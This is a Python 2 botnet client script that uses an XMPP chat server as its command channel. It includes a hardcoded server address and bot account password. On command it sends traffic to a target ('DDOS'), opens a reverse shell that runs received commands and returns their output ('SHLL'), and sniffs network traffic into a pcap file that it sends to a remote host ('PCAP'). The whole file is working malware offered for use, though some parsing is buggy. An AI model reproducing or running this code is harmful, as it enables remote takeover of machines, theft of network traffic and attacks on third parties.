#!/usr/bin/python2

# from subprocess import call
import sys, os, xmpp, time, select, socket, subprocess
from ctypes import c_char_p
from xmpp import *

class Bot:

    def __init__(self,jabber,remotejid):
        self.jabber = jabber
        self.remotejid = remotejid

    def register_handlers(self):
        self.jabber.RegisterHandler('message',self.xmpp_message)

    def xmpp_message(self, con, event):
        type = event.getType()
        fromjid = event.getFrom().getStripped()
        if type in ['message', 'chat', None] and event.getBody():
            # here's where you recieve a message
            command = event.getBody()
                # sys.stdout.write(command + '\n')
            # so for example if you wanted to DDoS and you had a command that would send an IP address and port to attack:

            # check the specific instruction to perform

            if command[0:4] == 'DDOS': # simple ddos attack
                ip = command[:command.find(':')]
                port = command[(command.find(':') + 1):]
                print (ip)
                print (port)

                sys.stdout.write("Sending spam packet to: " + command + '\n')
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                # s.sendall('GET / HTTP/1.1\r\nHost: ' + ip + '\r\n\r\n')
                s.sendall('zwen6')
                s.close()
                sys.stdout.write("sent... " + '\n')
                # call(["ls", "-l"])

            if command[0:4] == 'SHLL': # open up a reverse shell

                ip = command[:command.find(':')]
                port = command[(command.find(':') + 1):]
                print (ip)
                print (port)

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # connect to the host and port specified in the master's instruction
                s.connect((ip, port))
                # send confirmation
                s.send('SHLL')
                # start the shell
                while 1:
                    # receive shell commands
                    data = s.recv(1024) # a shell command of a maximum of 1024 chars
                    if data == 'exit' or data == 'quit': 
                        break
                    # do shell command
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    # read output
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    # send back output
                    s.send(stdout_value)
                # close socket
                s.close()

            if command[0:4] == 'PCAP': # sniff on the traffic and send back a pcap file
                # get 1024 packets and dump to pcap
                p = sniff(filter='tcp', iface='eth0', count=1024, prn= lambda x:x.summary)
                wrpcap('http_trans.pcap', p)

                ip = command[:command.find(':')]
                port = command[(command.find(':') + 1):]
                print (ip)
                print (port)

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # connect to the host and port specified in the master's instruction
                s.connect((ip, port))
                # send confirmation
                s.send('PCAP')

                # send the pcap over tcp
                f = open('http_trans.pcap','rb')
                l = f.read(1024)
                while (l):
                   s.send(l)
                   # print('sent ',repr(l))
                   l = f.read(1024)
                f.close()



    def stdio_message(self, message):
        # I believe this is for sending files over xmpp
        m = xmpp.protocol.Message(to=self.remotejid,body=message,typ='chat')
        self.jabber.send(m)
        pass

    def xmpp_connect(self):
        con=self.jabber.connect(('54.200.242.251','5222'),None,None) # replace address
	print ("???")
        if not con:
            sys.stderr.write('could not connect!\n')
            return False
        sys.stderr.write('connected with %s\n'%con)
        auth=self.jabber.auth(jid.getNode(),jidparams['password'],resource='crappy_script')
	print (jid.getNode())
	print (jidparams['password'])
        if not auth:
            sys.stderr.write('could not authenticate!\n')
            return False
        sys.stderr.write('authenticated using %s\n'%auth)
        self.register_handlers()
        return con

if __name__ == '__main__':

    master = sys.argv[1] # the ip address of the master
    # in a format like: admin@address
    # listen commands from it

    #PROBABLY SHOULD CHANGE THIS, EH?
    jidparams={'jid': 'bot_zwen6@54.200.242.251', 'password': '7wAxx4qiv'}
    
    jid=xmpp.protocol.JID(jidparams['jid'])
    cl=xmpp.Client('54.200.242.251',debug=[]) # replace the address here with your own jabba server
    print jid.getDomain()
    
    bot=Bot(cl,'bot_zwen6@54.200.242.251') # replace

    if not bot.xmpp_connect():
        sys.stderr.write("Could not connect to server, or password mismatch!\n")
        sys.exit(1)

    #cl.SendInitPresence(requestRoster=0)   # you may need to uncomment this for old server
    
    socketlist = {cl.Connection._sock:'xmpp',sys.stdin:'stdio'}
    cl.sendInitPresence()
    myRoster =  cl.getRoster()

    #Register yourself so you can talk to your master... not necessary every time you run, but necessary the first time you run
    #Each side of the conversation needs to "friend" each other. Subscribe makes it so the bot "friend requests" you.
    #Authorize makes it so the Bot "accepts your friend request"
    print (master)
    myRoster.Subscribe(master)
    myRoster.Authorize(master)
    online = 1

    while online:
        (i, o, e) = select.select(socketlist.keys(),[],[],1)
        for each in i:
            if socketlist[each] == 'xmpp':
                cl.Process(1)
            elif socketlist[each] == 'stdio':
                msg = sys.stdin.readline().rstrip('\r\n')
                bot.stdio_message(msg)
            else:
                raise Exception("Unknown socket type: %s" % repr(socketlist[each]))
    # cl.disconnect()

